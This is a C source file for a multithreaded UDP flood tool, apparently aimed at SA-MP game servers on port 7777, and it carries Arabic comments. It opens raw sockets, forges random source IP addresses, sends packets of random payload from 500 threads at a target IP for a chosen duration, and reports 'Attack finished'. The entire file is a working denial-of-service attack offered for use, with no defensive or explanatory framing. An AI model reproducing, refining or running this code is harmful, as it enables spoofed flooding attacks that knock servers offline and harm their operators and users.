
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define PACKET_SIZE 4096
#define PAYLOAD_SIZE 1024
#define THREADS 500

char *target_ip;
int duration;

// حساب checksum للبروتوكولات
unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum = 0;
    for (; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void *flood(void *arg) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket error");
        return NULL;
    }

    char packet[PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(7777); // ثابت لـ SAMP
    sin.sin_addr.s_addr = inet_addr(target_ip);

    time_t end = time(NULL) + duration;

    while (time(NULL) < end) {
        memset(packet, 0, PACKET_SIZE);

        // IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD_SIZE);
        iph->id = rand();
        iph->ttl = 64;
        iph->protocol = IPPROTO_UDP;
        iph->saddr = rand(); // IP مزيف
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum((unsigned short *)packet, iph->tot_len >> 1);

        // UDP Header
        udph->source = htons(rand() % 65535);
        udph->dest = htons(7777);
        udph->len = htons(sizeof(struct udphdr) + PAYLOAD_SIZE);
        udph->check = 0;

        // Payload
        for (int i = 0; i < PAYLOAD_SIZE; i++) {
            packet[sizeof(struct iphdr) + sizeof(struct udphdr) + i] = rand() % 256;
        }

        sendto(sock, packet, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <Target IP> <Duration>\n", argv[0]);
        return 1;
    }

    target_ip = argv[1];
    duration = atoi(argv[2]);

    printf("Starting Strong UDP Flood on %s (port 7777) for %d seconds...\n", target_ip, duration);

    for (int i = 0; i < THREADS; i++) {
        pthread_t thread;
        pthread_create(&thread, NULL, flood, NULL);
    }

    sleep(duration);
    printf("Attack finished.\n");
    return 0;
}
